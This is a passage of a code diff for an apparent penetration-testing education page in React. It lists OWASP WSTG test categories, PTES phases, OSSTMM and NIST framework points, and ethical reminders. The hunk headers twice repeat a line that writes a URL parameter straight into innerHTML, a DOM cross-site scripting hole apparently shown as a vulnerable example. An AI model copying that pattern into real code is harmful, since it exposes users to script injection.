+                    <div className="p-3 bg-red-900/20 border border-red-500 rounded">
+                      <h6 className="font-semibold text-red-400">A01:2021 - Broken Access Control</h6>
+                      <ul className="text-sm mt-2 space-y-1">
+                        <li>• WSTG-AUTHZ-01: Directory traversal</li>
+                        <li>• WSTG-AUTHZ-02: Authorization bypass</li>
+                        <li>• WSTG-AUTHZ-03: Privilege escalation</li>
+                        <li>• WSTG-AUTHZ-04: Insecure direct object references</li>
+                      </ul>
                     </div>
-                    <div className="p-2 bg-orange-900/20 border border-orange-500 rounded">
-                      <strong className="text-orange-400">High:</strong> Significant security risk
+                    
+                    <div className="p-3 bg-orange-900/20 border border-orange-500 rounded">
+                      <h6 className="font-semibold text-orange-400">A02:2021 - Cryptographic Failures</h6>
+                      <ul className="text-sm mt-2 space-y-1">
+                        <li>• WSTG-CRYP-01: Weak SSL/TLS ciphers</li>
+                        <li>• WSTG-CRYP-02: Padding oracle</li>
+                        <li>• WSTG-CRYP-03: Sensitive data exposure</li>
+                        <li>• WSTG-CRYP-04: Weak random number generation</li>
+                      </ul>
                     </div>
-                    <div className="p-2 bg-yellow-900/20 border border-yellow-500 rounded">
-                      <strong className="text-yellow-400">Medium:</strong> Moderate security concern
+                    
+                    <div className="p-3 bg-yellow-900/20 border border-yellow-500 rounded">
+                      <h6 className="font-semibold text-yellow-400">A03:2021 - Injection</h6>
+                      <ul className="text-sm mt-2 space-y-1">
+                        <li>• WSTG-INPV-05: SQL injection</li>
+                        <li>• WSTG-INPV-06: LDAP injection</li>
+                        <li>• WSTG-INPV-07: XML injection</li>
+                        <li>• WSTG-INPV-11: Code injection</li>
+                        <li>• WSTG-INPV-12: Command injection</li>
+                      </ul>
                     </div>
-                    <div className="p-2 bg-blue-900/20 border border-blue-500 rounded">
-                      <strong className="text-blue-400">Low:</strong> Minor security issue
+                  </div>
+                  
+                  <div className="space-y-2">
+                    <div className="p-3 bg-blue-900/20 border border-blue-500 rounded">
+                      <h6 className="font-semibold text-blue-400">A07:2021 - Identification & Authentication</h6>
+                      <ul className="text-sm mt-2 space-y-1">
+                        <li>• WSTG-ATHN-01: Authentication bypass</li>
+                        <li>• WSTG-ATHN-02: Default credentials</li>
+                        <li>• WSTG-ATHN-03: Weak lock-out mechanisms</li>
+                        <li>• WSTG-ATHN-04: Authentication scheme bypass</li>
+                      </ul>
                     </div>
-                    <div className="p-2 bg-green-900/20 border border-green-500 rounded">
-                      <strong className="text-green-400">Info:</strong> Informational finding
+                    
+                    <div className="p-3 bg-green-900/20 border border-green-500 rounded">
+                      <h6 className="font-semibold text-green-400">A10:2021 - Server-Side Request Forgery</h6>
+                      <ul className="text-sm mt-2 space-y-1">
+                        <li>• WSTG-INPV-19: Server-side request forgery</li>
+                        <li>• Cloud metadata service access</li>
+                        <li>• Internal network enumeration</li>
+                        <li>• Port scanning via SSRF</li>
+                      </ul>
+                    </div>
+                    
+                    <div className="p-3 bg-purple-900/20 border border-purple-500 rounded">
+                      <h6 className="font-semibold text-purple-400">Business Logic Testing</h6>
+                      <ul className="text-sm mt-2 space-y-1">
+                        <li>• WSTG-BUSLOGIC-01: Data validation logic</li>
+                        <li>• WSTG-BUSLOGIC-02: Forged requests</li>
+                        <li>• WSTG-BUSLOGIC-03: Integrity checks</li>
+                        <li>• WSTG-BUSLOGIC-04: Process timing</li>
+                      </ul>
                     </div>
                   </div>
                 </div>
@@ -1056,30 +2378,242 @@ document.getElementById('content').innerHTML = params.get('message');
             </AccordionContent>
           </AccordionItem>
 
-          <AccordionItem value="osstmm">
+          <AccordionItem value="ptes-framework">
             <AccordionTrigger className="text-lg font-semibold">
-              OSSTMM (Open Source Security Testing Methodology)
+              PTES (Penetration Testing Execution Standard) - Complete Framework
             </AccordionTrigger>
-            <AccordionContent className="space-y-4">
-              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+            <AccordionContent className="space-y-6">
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                 <div>
-                  <h5 className="font-semibold mb-3">Scientific Approach</h5>
-                  <ul className="list-disc pl-6 space-y-1">
-                    <li><strong>Reproducible Results:</strong> Consistent testing methodology</li>
-                    <li><strong>Measurable Security:</strong> Quantitative analysis</li>
-                    <li><strong>Trust Analysis:</strong> Security vs functionality balance</li>
-                    <li><strong>Operational Controls:</strong> Real-world security effectiveness</li>
-                  </ul>
+                  <h5 className="font-semibold mb-3 text-cybr-primary">PTES Seven-Phase Methodology</h5>
+                  <div className="space-y-3">
+                    <div className="p-3 bg-blue-900/20 border border-blue-500 rounded">
+                      <h6 className="font-semibold text-blue-400 mb-2">1. Pre-engagement Interactions</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• Scoping discussions and target definition</li>
+                        <li>• Rules of engagement establishment</li>
+                        <li>• Timeline and resource allocation</li>
+                        <li>• Legal documentation and NDAs</li>
+                        <li>• Communication protocols setup</li>
+                      </ul>
+                    </div>
+                    
+                    <div className="p-3 bg-green-900/20 border border-green-500 rounded">
+                      <h6 className="font-semibold text-green-400 mb-2">2. Intelligence Gathering</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• OSINT collection and analysis</li>
+                        <li>• Target asset identification</li>
+                        <li>• Network footprinting</li>
+                        <li>• Social engineering preparation</li>
+                        <li>• Physical security assessment</li>
+                      </ul>
+                    </div>
+                    
+                    <div className="p-3 bg-yellow-900/20 border border-yellow-500 rounded">
+                      <h6 className="font-semibold text-yellow-400 mb-2">3. Threat Modeling</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• Attack surface analysis</li>
+                        <li>• Threat actor profiling</li>
+                        <li>• Attack vector prioritization</li>
+                        <li>• Business impact assessment</li>
+                        <li>• Risk-based testing approach</li>
+                      </ul>
+                    </div>
+                  </div>
                 </div>
+                
                 <div>
-                  <h5 className="font-semibold mb-3">Testing Channels</h5>
-                  <ul className="list-disc pl-6 space-y-1">
-                    <li><strong>Human Security:</strong> Social engineering, physical access</li>
-                    <li><strong>Physical Security:</strong> Facility and hardware security</li>
-                    <li><strong>Wireless Security:</strong> RF communications security</li>
-                    <li><strong>Telecommunications:</strong> Voice and data communications</li>
-                    <li><strong>Data Networks:</strong> Network infrastructure security</li>
-                  </ul>
+                  <h5 className="font-semibold mb-3 text-cybr-primary">Advanced PTES Phases</h5>
+                  <div className="space-y-3">
+                    <div className="p-3 bg-purple-900/20 border border-purple-500 rounded">
+                      <h6 className="font-semibold text-purple-400 mb-2">4. Vulnerability Analysis</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• Automated and manual vulnerability scanning</li>
+                        <li>• False positive elimination</li>
+                        <li>• Exploitation feasibility assessment</li>
+                        <li>• CVSS scoring and risk analysis</li>
+                        <li>• Custom vulnerability research</li>
+                      </ul>
+                    </div>
+                    
+                    <div className="p-3 bg-red-900/20 border border-red-500 rounded">
+                      <h6 className="font-semibold text-red-400 mb-2">5. Exploitation</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• Initial compromise and foothold</li>
+                        <li>• Privilege escalation techniques</li>
+                        <li>• Lateral movement and persistence</li>
+                        <li>• Data collection and exfiltration</li>
+                        <li>• Attack chain documentation</li>
+                      </ul>
+                    </div>
+                    
+                    <div className="p-3 bg-orange-900/20 border border-orange-500 rounded">
+                      <h6 className="font-semibold text-orange-400 mb-2">6. Post Exploitation & 7. Reporting</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• Network mapping and trust relationships</li>
+                        <li>• Business impact demonstration</li>
+                        <li>• Evidence collection and preservation</li>
+                        <li>• Executive and technical reporting</li>
+                        <li>• Remediation roadmap development</li>
+                      </ul>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              
+              <div className="mt-6">
+                <h5 className="font-semibold mb-3 text-cybr-primary">PTES Risk Rating Framework</h5>
+                <div className="grid grid-cols-1 md:grid-cols-5 gap-3">
+                  <div className="p-3 bg-red-900/20 border border-red-500 rounded text-center">
+                    <h6 className="font-semibold text-red-400 mb-1">Critical</h6>
+                    <p className="text-xs">Immediate threat to business operations</p>
+                  </div>
+                  <div className="p-3 bg-orange-900/20 border border-orange-500 rounded text-center">
+                    <h6 className="font-semibold text-orange-400 mb-1">High</h6>
+                    <p className="text-xs">Significant security risk requiring urgent attention</p>
+                  </div>
+                  <div className="p-3 bg-yellow-900/20 border border-yellow-500 rounded text-center">
+                    <h6 className="font-semibold text-yellow-400 mb-1">Medium</h6>
+                    <p className="text-xs">Moderate security concern</p>
+                  </div>
+                  <div className="p-3 bg-blue-900/20 border border-blue-500 rounded text-center">
+                    <h6 className="font-semibold text-blue-400 mb-1">Low</h6>
+                    <p className="text-xs">Minor security issue with limited impact</p>
+                  </div>
+                  <div className="p-3 bg-green-900/20 border border-green-500 rounded text-center">
+                    <h6 className="font-semibold text-green-400 mb-1">Info</h6>
+                    <p className="text-xs">Informational finding for awareness</p>
+                  </div>
+                </div>
+              </div>
+            </AccordionContent>
+          </AccordionItem>
+
+          <AccordionItem value="osstmm-methodology">
+            <AccordionTrigger className="text-lg font-semibold">
+              OSSTMM (Open Source Security Testing Methodology) - Scientific Approach
+            </AccordionTrigger>
+            <AccordionContent className="space-y-6">
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+                <div>
+                  <h5 className="font-semibold mb-3 text-cybr-primary">OSSTMM Security Analysis Framework</h5>
+                  <div className="space-y-3">
+                    <div className="p-3 bg-cybr-muted/30 rounded">
+                      <h6 className="font-semibold text-blue-400 mb-2">Core Security Metrics</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• <strong>Porosity:</strong> System openness measurement</li>
+                        <li>• <strong>Limitations:</strong> Security control boundaries</li>
+                        <li>• <strong>Controls:</strong> Protective mechanism effectiveness</li>
+                        <li>• <strong>Trust:</strong> Relationship verification strength</li>
+                        <li>• <strong>Visibility:</strong> Information exposure assessment</li>
+                      </ul>
+                    </div>
+                    
+                    <div className="p-3 bg-cybr-muted/30 rounded">
+                      <h6 className="font-semibold text-green-400 mb-2">Scientific Principles</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• Reproducible and consistent results</li>
+                        <li>• Measurable security quantification</li>
+                        <li>• Objective analysis methodology</li>
+                        <li>• Peer-reviewable testing procedures</li>
+                        <li>• Evidence-based security assessment</li>
+                      </ul>
+                    </div>
+                  </div>
+                </div>
+                
+                <div>
+                  <h5 className="font-semibold mb-3 text-cybr-primary">OSSTMM Testing Channels</h5>
+                  <div className="space-y-3">
+                    <div className="p-3 bg-purple-900/20 border border-purple-500 rounded">
+                      <h6 className="font-semibold text-purple-400 mb-2">1. Human Security Testing</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• Social engineering attack simulations</li>
+                        <li>• Physical security and access controls</li>
+                        <li>• Personnel security awareness assessment</li>
+                        <li>• Training effectiveness evaluation</li>
+                      </ul>
+                    </div>
+                    
+                    <div className="p-3 bg-orange-900/20 border border-orange-500 rounded">
+                      <h6 className="font-semibold text-orange-400 mb-2">2. Physical Security Testing</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• Perimeter security assessment</li>
+                        <li>• Building security controls</li>
+                        <li>• Environmental control systems</li>
+                        <li>• Asset protection mechanisms</li>
+                      </ul>
+                    </div>
+                    
+                    <div className="p-3 bg-cyan-900/20 border border-cyan-500 rounded">
+                      <h6 className="font-semibold text-cyan-400 mb-2">3. Wireless & Network Security</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• Wi-Fi and Bluetooth security</li>
+                        <li>• Network architecture assessment</li>
+                        <li>• Protocol security analysis</li>
+                        <li>• Intrusion detection effectiveness</li>
+                      </ul>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </AccordionContent>
+          </AccordionItem>
+
+          <AccordionItem value="nist-framework">
+            <AccordionTrigger className="text-lg font-semibold">
+              NIST Cybersecurity Framework Integration
+            </AccordionTrigger>
+            <AccordionContent className="space-y-6">
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+                <div>
+                  <h5 className="font-semibold mb-3 text-cybr-primary">NIST Framework Functions</h5>
+                  <div className="space-y-3">
+                    <div className="p-3 bg-blue-900/20 border border-blue-500 rounded">
+                      <h6 className="font-semibold text-blue-400 mb-2">Identify</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• Asset management and inventory</li>
+                        <li>• Business environment understanding</li>
+                        <li>• Governance and risk assessment</li>
+                        <li>• Risk management strategy</li>
+                      </ul>
+                    </div>
+                    
+                    <div className="p-3 bg-green-900/20 border border-green-500 rounded">
+                      <h6 className="font-semibold text-green-400 mb-2">Protect & Detect</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• Access control implementation</li>
+                        <li>• Awareness and training programs</li>
+                        <li>• Data security and privacy</li>
+                        <li>• Anomaly detection systems</li>
+                      </ul>
+                    </div>
+                  </div>
+                </div>
+                
+                <div>
+                  <h5 className="font-semibold mb-3 text-cybr-primary">Response & Recovery Integration</h5>
+                  <div className="space-y-3">
+                    <div className="p-3 bg-orange-900/20 border border-orange-500 rounded">
+                      <h6 className="font-semibold text-orange-400 mb-2">Respond</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• Response planning and procedures</li>
+                        <li>• Communications during incidents</li>
+                        <li>• Analysis and mitigation strategies</li>
+                        <li>• Improvements based on lessons learned</li>
+                      </ul>
+                    </div>
+                    
+                    <div className="p-3 bg-purple-900/20 border border-purple-500 rounded">
+                      <h6 className="font-semibold text-purple-400 mb-2">Recover</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• Recovery planning and processes</li>
+                        <li>• Improvements based on testing</li>
+                        <li>• Communications during recovery</li>
+                        <li>• Business continuity planning</li>
+                      </ul>
+                    </div>
+                  </div>
                 </div>
               </div>
             </AccordionContent>
@@ -1087,46 +2621,61 @@ document.getElementById('content').innerHTML = params.get('message');
         </Accordion>
       </div>
 
-      {/* Additional Resources */}
+      {/* Professional Considerations */}
       <div className="card">
         <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
           <AlertTriangle className="h-7 w-7 text-cybr-primary" />
-          Professional Considerations
+          Professional Standards & Best Practices
         </h3>
         
-        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+        <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
           <div>
-            <h4 className="font-semibold mb-3 text-cybr-primary">Legal & Ethical</h4>
-            <ul className="list-disc pl-6 space-y-1 text-sm">
-              <li>Written authorization required</li>
-              <li>Scope limitations and boundaries</li>
-              <li>Data protection compliance</li>
-              <li>Responsible disclosure practices</li>
-              <li>Liability and insurance considerations</li>
+            <h4 className="font-semibold mb-3 text-cybr-primary">Legal & Ethical Framework</h4>
+            <ul className="list-disc pl-6 space-y-2 text-sm">
+              <li><strong>Authorization Requirements:</strong> Written permission and scope definition</li>
+              <li><strong>Legal Compliance:</strong> GDPR, HIPAA, SOX regulatory considerations</li>
+              <li><strong>Responsible Disclosure:</strong> Coordinated vulnerability disclosure</li>
+              <li><strong>Data Protection:</strong> Client data handling and storage</li>
+              <li><strong>Insurance & Liability:</strong> Professional indemnity coverage</li>
+              <li><strong>Jurisdictional Issues:</strong> Cross-border testing implications</li>
             </ul>
           </div>
           
           <div>
-            <h4 className="font-semibold mb-3 text-cybr-primary">Documentation</h4>
-            <ul className="list-disc pl-6 space-y-1 text-sm">
-              <li>Detailed methodology description</li>
-              <li>Step-by-step reproduction guides</li>
-              <li>Evidence collection and preservation</li>
-              <li>Executive and technical reporting</li>
-              <li>Remediation recommendations</li>
+            <h4 className="font-semibold mb-3 text-cybr-primary">Documentation Standards</h4>
+            <ul className="list-disc pl-6 space-y-2 text-sm">
+              <li><strong>Methodology Documentation:</strong> Detailed testing procedures</li>
+              <li><strong>Evidence Collection:</strong> Screenshots, logs, proof-of-concept</li>
+              <li><strong>Chain of Custody:</strong> Evidence handling procedures</li>
+              <li><strong>Reproducible Steps:</strong> Vulnerability reproduction guides</li>
+              <li><strong>Risk Assessment:</strong> CVSS scoring and business impact</li>
+              <li><strong>Remediation Guidance:</strong> Specific fix recommendations</li>
             </ul>
           </div>
           
           <div>
             <h4 className="font-semibold mb-3 text-cybr-primary">Quality Assurance</h4>
-            <ul className="list-disc pl-6 space-y-1 text-sm">
-              <li>Peer review processes</li>
-              <li>False positive validation</li>
-              <li>Impact assessment accuracy</li>
-              <li>Client communication protocols</li>
-              <li>Continuous methodology improvement</li>
+            <ul className="list-disc pl-6 space-y-2 text-sm">
+              <li><strong>Peer Review Process:</strong> Technical validation and verification</li>
+              <li><strong>False Positive Management:</strong> Accuracy verification</li>
+              <li><strong>Testing Coverage:</strong> Comprehensive assessment scope</li>
+              <li><strong>Client Communication:</strong> Regular updates and status reports</li>
+              <li><strong>Continuous Improvement:</strong> Methodology enhancement</li>
+              <li><strong>Professional Development:</strong> Certification and training</li>
             </ul>
           </div>
+        </div>
+        
+        <div className="mt-6 p-4 bg-gradient-to-r from-red-900/20 to-orange-900/20 border border-red-500 rounded-lg">
+          <h4 className="font-semibold mb-2 text-red-400">Critical Professional Reminders</h4>
+          <ul className="text-sm space-y-1">
+            <li>• <strong>Never test without explicit written authorization</strong></li>
+            <li>• <strong>Respect scope limitations and boundaries at all times</strong></li>
+            <li>• <strong>Maintain confidentiality of client information and findings</strong></li>
+            <li>• <strong>Follow responsible disclosure practices for vulnerabilities</strong></li>
+            <li>• <strong>Document everything methodically with timestamps and evidence</strong></li>
+            <li>• <strong>Provide actionable remediation recommendations</strong></li>
+          </ul>
         </div>
       </div>
     </div>
